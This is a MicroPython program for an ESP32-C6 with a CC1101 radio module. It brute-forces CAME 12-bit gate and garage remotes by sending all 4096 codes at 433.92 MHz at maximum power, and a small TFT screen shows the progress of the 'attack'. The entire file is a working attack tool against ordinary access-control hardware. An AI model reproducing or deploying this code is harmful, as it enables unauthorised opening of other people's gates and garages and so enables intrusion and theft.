"""
CAME 12-bit Bruteforce for ESP32-C6 with CC1101
Based on Flipper Zero CAME protocol implementation
Pinout:
- GPIO6 (SCK)  -> SCK
- GPIO5 (MISO) -> MISO
- GPIO4 (MOSI) -> MOSI
- GPIO10 (CS)  -> CSN
- GPIO9        -> GDO0
- 3.3V         -> VCC
- GND          -> GND
"""

import st7789
import machine
import time
from machine import SPI, Pin
import vga1_16x32 as font32
import vga1_8x16 as font16

spi = SPI(
    1,
    baudrate=20000000,
    polarity=0,
    phase=0,
    sck=Pin(18),
    mosi=Pin(19)
)

tft = st7789.ST7789(
    spi,
    240,
    320,
    reset=Pin(20, Pin.OUT),
    dc=Pin(21, Pin.OUT),
    cs=Pin(22, Pin.OUT),
    rotation=1
)

tft.fill(st7789.BLACK)
tft.text(font32, "Rozpoczynanie...", 30, 90, st7789.WHITE)

# CC1101 Register Addresses
CC1101_IOCFG2 = 0x00
CC1101_IOCFG1 = 0x01
CC1101_IOCFG0 = 0x02
CC1101_FIFOTHR = 0x03
CC1101_SYNC1 = 0x04
CC1101_SYNC0 = 0x05
CC1101_PKTLEN = 0x06
CC1101_PKTCTRL1 = 0x07
CC1101_PKTCTRL0 = 0x08
CC1101_ADDR = 0x09
CC1101_CHANNR = 0x0A
CC1101_FSCTRL1 = 0x0B
CC1101_FSCTRL0 = 0x0C
CC1101_FREQ2 = 0x0D
CC1101_FREQ1 = 0x0E
CC1101_FREQ0 = 0x0F
CC1101_MDMCFG4 = 0x10
CC1101_MDMCFG3 = 0x11
CC1101_MDMCFG2 = 0x12
CC1101_MDMCFG1 = 0x13
CC1101_MDMCFG0 = 0x14
CC1101_DEVIATN = 0x15
CC1101_MCSM2 = 0x16
CC1101_MCSM1 = 0x17
CC1101_MCSM0 = 0x18
CC1101_FOCCFG = 0x19
CC1101_BSCFG = 0x1A
CC1101_AGCCTRL2 = 0x1B
CC1101_AGCCTRL1 = 0x1C
CC1101_AGCCTRL0 = 0x1D
CC1101_WOREVT1 = 0x1E
CC1101_WOREVT0 = 0x1F
CC1101_WORCTRL = 0x20
CC1101_FREND1 = 0x21
CC1101_FREND0 = 0x22
CC1101_FSCAL3 = 0x23
CC1101_FSCAL2 = 0x24
CC1101_FSCAL1 = 0x25
CC1101_FSCAL0 = 0x26
CC1101_RCCTRL1 = 0x27
CC1101_RCCTRL0 = 0x28
CC1101_FSTEST = 0x29
CC1101_PTEST = 0x2A
CC1101_AGCTEST = 0x2B
CC1101_TEST2 = 0x2C
CC1101_TEST1 = 0x2D
CC1101_TEST0 = 0x2E
CC1101_PARTNUM = 0x30
CC1101_VERSION = 0x31
CC1101_FREQEST = 0x32
CC1101_LQI = 0x33
CC1101_RSSI = 0x34
CC1101_MARCSTATE = 0x35
CC1101_WORTIME1 = 0x36
CC1101_WORTIME0 = 0x37
CC1101_PKTSTATUS = 0x38
CC1101_VCO_VC_DAC = 0x39
CC1101_TXBYTES = 0x3A
CC1101_RXBYTES = 0x3B
CC1101_RCCTRL1_STATUS = 0x3C
CC1101_RCCTRL0_STATUS = 0x3D
CC1101_PATABLE = 0x3E
CC1101_TXFIFO = 0x3F
CC1101_RXFIFO = 0x3F

# Command Strobes
CC1101_SRES = 0x30
CC1101_SFSTXON = 0x31
CC1101_SXOFF = 0x32
CC1101_SCAL = 0x33
CC1101_SRX = 0x34
CC1101_STX = 0x35
CC1101_SIDLE = 0x36
CC1101_SWOR = 0x38
CC1101_SPWD = 0x39
CC1101_SFRX = 0x3A
CC1101_SFTX = 0x3B
CC1101_SWORRST = 0x3C
CC1101_SNOP = 0x3D

class CC1101:
    def __init__(self, spi_id=1, sck_pin=6, miso_pin=5, mosi_pin=4, cs_pin=10, gdo0_pin=9):
        self.cs = Pin(cs_pin, Pin.OUT, value=1)
        self.gdo0 = Pin(gdo0_pin, Pin.IN)  # GDO0 as input (CC1101 controls it)
        self.spi = SPI(
            spi_id,
            baudrate=1000000,
            polarity=0,
            phase=0,
            sck=Pin(sck_pin),
            miso=Pin(miso_pin),
            mosi=Pin(mosi_pin)
        )
        self._init_registers()
        
    def _write_reg(self, reg, data):
        self.cs.value(0)
        self.spi.write(bytes([reg, data]))
        self.cs.value(1)
        time.sleep_us(5)

    def _read_reg(self, reg, burst=False):
        self.cs.value(0)
        if burst:
            self.spi.write(bytes([reg | 0xC0]))
        else:
            self.spi.write(bytes([reg | 0x80]))
        data = self.spi.read(1)
        self.cs.value(1)
        return data[0]

    def _write_burst(self, reg, values):
        self.cs.value(0)
        self.spi.write(bytes([reg | 0x40]) + bytes(values))
        self.cs.value(1)

    def _strobe(self, cmd):
        self.cs.value(0)
        self.spi.write(bytes([cmd]))
        self.cs.value(1)
        time.sleep_us(10)

    def _init_registers(self):
        """Inicjalizacja CC1101 dla FIFO TX z ustawieniami mocy z działającego kodu"""
        # Reset
        self._strobe(CC1101_SRES)
        time.sleep_ms(10)

        # GDO0 - serial data output for FIFO
        self._write_reg(CC1101_IOCFG0, 0x0D)
        self._write_reg(CC1101_IOCFG1, 0x2E)
        self._write_reg(CC1101_IOCFG2, 0x0D)

        # FIFO settings
        self._write_reg(CC1101_FIFOTHR, 0x47)

        # No sync word
        self._write_reg(CC1101_SYNC1, 0x00)
        self._write_reg(CC1101_SYNC0, 0x00)

        # Packet mode disabled for continuous TX
        self._write_reg(CC1101_PKTCTRL0, 0x00)
        self._write_reg(CC1101_PKTCTRL1, 0x04)
        self._write_reg(CC1101_PKTLEN, 0xFF)

        # Częstotliwość 433.92 MHz (z działającego kodu)
        self._write_reg(CC1101_FREQ2, 0x10)
        self._write_reg(CC1101_FREQ1, 0xB0)
        self._write_reg(CC1101_FREQ0, 0x71)
        self._write_reg(CC1101_FSCTRL1, 0x0F)
        self._write_reg(CC1101_FSCTRL0, 0x00)

        # AM650 (ASK/OOK) modulation - restored
        self._write_reg(CC1101_MDMCFG4, 0xF6)
        self._write_reg(CC1101_MDMCFG3, 0x83)
        self._write_reg(CC1101_MDMCFG2, 0x13)  # ASK/OOK (AM650)
        self._write_reg(CC1101_MDMCFG1, 0x22)
        self._write_reg(CC1101_MDMCFG0, 0xF8)
        self._write_reg(CC1101_DEVIATN, 0x15)

        # Sterowanie (z działającego kodu)
        self._write_reg(CC1101_MCSM2, 0x07)
        self._write_reg(CC1101_MCSM1, 0x30)
        self._write_reg(CC1101_MCSM0, 0x18)

        # AGC (z działającego kodu)
        self._write_reg(CC1101_FOCCFG, 0x16)
        self._write_reg(CC1101_BSCFG, 0x6C)
        self._write_reg(CC1101_AGCCTRL2, 0x43)
        self._write_reg(CC1101_AGCCTRL1, 0x40)
        self._write_reg(CC1101_AGCCTRL0, 0x91)

        # Front-end (z działającego kodu)
        self._write_reg(CC1101_FREND1, 0xB6)
        self._write_reg(CC1101_FREND0, 0x10)

        # Kalibracja (z działającego kodu)
        self._write_reg(CC1101_FSCAL3, 0xE9)
        self._write_reg(CC1101_FSCAL2, 0x2A)
        self._write_reg(CC1101_FSCAL1, 0x00)
        self._write_reg(CC1101_FSCAL0, 0x1F)

        # PA Table - max power (z działającego kodu)
        self._write_burst(CC1101_PATABLE, [0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0])

        # Kalibracja
        self._strobe(CC1101_SCAL)
        time.sleep_ms(10)
        self._strobe(CC1101_SIDLE)
        time.sleep_ms(1)

    def tx_on(self):
        self._strobe(CC1101_STX)
        time.sleep_us(50)

    def tx_off(self):
        self._strobe(CC1101_SIDLE)
        time.sleep_us(50)


class CAMEBruteforce:
    """CAME 12-bit protocol bruteforcer using CC1101 FIFO"""

    # CAME protocol timing - EXACT from phreakerclub.com (Flipper Zero uses this)
    TE_SHORT = 320  # microseconds
    TE_LONG = 640   # microseconds
    PREAMBLE = 11520  # microseconds (36 * 320) - not 15040!
    BITS = 12
    REPEATS = 3

    def __init__(self, cc1101):
        self.cc1101 = cc1101

    def int_to_hex(self, num):
        chars = "0123456789ABCDEF"
        result = ""
        for i in range(3, -1, -1):
            digit = (num >> (i * 4)) & 0xF
            result += chars[digit]
        return result

    def send_code(self, code):
        """
        Transmit CAME 12-bit code using CC1101 FIFO
        Data rate 3125 bps (320us per bit) - EXACT CAME timing from phreakerclub.com
        PREAMBLE = 11520us (36 * 320us)
        """
        # Build bit sequence for FIFO
        bit_sequence = []

        for _ in range(self.REPEATS):
            # Preamble: 36 bits low (36 * 320us = 11520us) - EXACT from phreakerclub.com
            bit_sequence.extend([0] * 36)

            # Start bit: 1 bit high (320us)
            bit_sequence.append(1)

            # Data bits (12 bits, MSB first)
            for i in range(11, -1, -1):
                bit = (code >> i) & 1
                if bit:
                    # Bit 1: TE_LONG low + TE_SHORT high = 640us + 320us
                    # At 3125 bps: 2 bits low + 1 bit high
                    bit_sequence.extend([0, 0, 1])
                else:
                    # Bit 0: TE_SHORT low + TE_LONG high = 320us + 640us
                    # At 3125 bps: 1 bit low + 2 bits high
                    bit_sequence.extend([0, 1, 1])

        # Convert bit sequence to bytes
        fifo_data = bytearray()
        for i in range(0, len(bit_sequence), 8):
            byte_val = 0
            for j in range(8):
                if i + j < len(bit_sequence):
                    if bit_sequence[i + j]:
                        byte_val |= (1 << (7 - j))
            fifo_data.append(byte_val)

        # Calibrate before transmission (like Flipper Zero)
        self.cc1101._strobe(CC1101_SCAL)
        time.sleep_us(100)

        # Clear TX FIFO
        self.cc1101._strobe(CC1101_SFTX)
        time.sleep_us(100)

        # Write data to TX FIFO without delays
        chunk_size = 32
        for i in range(0, len(fifo_data), chunk_size):
            chunk = fifo_data[i:i+chunk_size]
            self.cc1101._write_burst(CC1101_TXFIFO, chunk)
            time.sleep_us(50)  # Minimal delay instead of 2ms

            if i + chunk_size < len(fifo_data):
                while (self.cc1101._read_reg(CC1101_TXBYTES, burst=False) & 0x7F) > 32:
                    time.sleep_us(50)

        # Start transmission
        self.cc1101.tx_on()

        # Wait for transmission to complete
        timeout = 200
        start_time = time.ticks_ms()
        while (self.cc1101._read_reg(CC1101_TXBYTES, burst=False) & 0x7F) > 0:
            if time.ticks_diff(time.ticks_ms(), start_time) > timeout:
                break
            time.sleep_ms(5)

        # Go back to idle
        self.cc1101.tx_off()
    
    def bruteforce(self, start_code=0, end_code=4095, delay_ms=10):
        """
        Bruteforce CAME 12-bit codes from start_code to end_code
        """
        total = end_code - start_code + 1
        print("="*60)
        print("CAME BRUTE FORCE 12-bit")
        print("="*60)
        print("Start: " + str(start_code))
        print("Total: " + str(total))
        print("Short: " + str(self.TE_SHORT) + "us")
        print("Long: " + str(self.TE_LONG) + "us")
        print("Preamble: " + str(self.PREAMBLE) + "us")
        print("Delay: " + str(delay_ms) + "ms")
        print("Press Ctrl+C to stop")
        print("="*60)

        codes_sent = 0
        start_time = time.ticks_ms()

        try:
            for code in range(start_code, end_code + 1):
                cc1101 = CC1101()
                self.send_code(code)
                codes_sent += 1
                if left.value() == 0:
                    machine.reset()
        
                    while up.value() == 0:
                        time.sleep_ms(10)

                if codes_sent % 10 == 0:
                    spi = SPI(
                        1,
                        baudrate=20000000,
                        polarity=0,
                        phase=0,
                        sck=Pin(18),
                        mosi=Pin(19)
                    )
                    progress = (codes_sent / total) * 100
                    elapsed = time.ticks_diff(time.ticks_ms(), start_time) // 1000
                    tft.fill(st7789.BLACK)
                    tft.text(font32, "Atakowanie:", 80, 20, st7789.RED)
                    tft.text(font16, "Wyslano", 110, 90, st7789.WHITE)
                    tft.text(font16, "kodow.", 110, 160, st7789.WHITE)
                    tft.text(font16, "Kliknij lewo aby przerwac <-", 20, 220, st7789.WHITE)
                    tft.text(font32, str(codes_sent) +"/" + str(total), 100, 120, st7789.WHITE)

                time.sleep_ms(delay_ms)
        except KeyboardInterrupt:
            print("\nSTOPPED!")

        elapsed = time.ticks_diff(time.ticks_ms(), start_time) // 1000
        spi = SPI(
            1,
            baudrate=20000000,
            polarity=0,
            phase=0,
            sck=Pin(18),
            mosi=Pin(19)
        )
        tft.fill(st7789.BLACK)
        tft.text(font32, "Ukonczono!", 60, 100, st7789.WHITE)
        print("\n" + "="*60)
        print("COMPLETE!")
        print("Sent: " + str(codes_sent))
        print("Time: " + str(elapsed) + "s")
        print("="*60)
        time.sleep(2)
        machine.reset()

        return codes_sent

left = Pin(2, Pin.IN, Pin.PULL_UP)

def main():
    """Main function - starts bruteforce immediately"""
    print("="*60)
    print("CAME 12-bit Bruteforce for ESP32-C6 with CC1101")
    print("Using FIFO transmission with max power settings")
    print("="*60)

    cc1101 = CC1101(
        spi_id=1,
        sck_pin=6,
        miso_pin=5,
        mosi_pin=4,
        cs_pin=10,
        gdo0_pin=9
    )
    came = CAMEBruteforce(cc1101)

    print("\nCC1101 initialized with max power settings")
    print("Timing CAME: SHORT=320us, LONG=640us, PREAMBLE=11520us")
    print("\nStarting bruteforce from 0 to 4095...")
    print("Press Ctrl+C to stop\n")

    try:
        came.bruteforce(start_code=0, end_code=4095, delay_ms=10)  # Small delay for receiver reset
    except KeyboardInterrupt:
        print("\nBruteforce stopped by user")
    except Exception as e:
        print(f"\nError: {e}")


if __name__ == "__main__":
    main()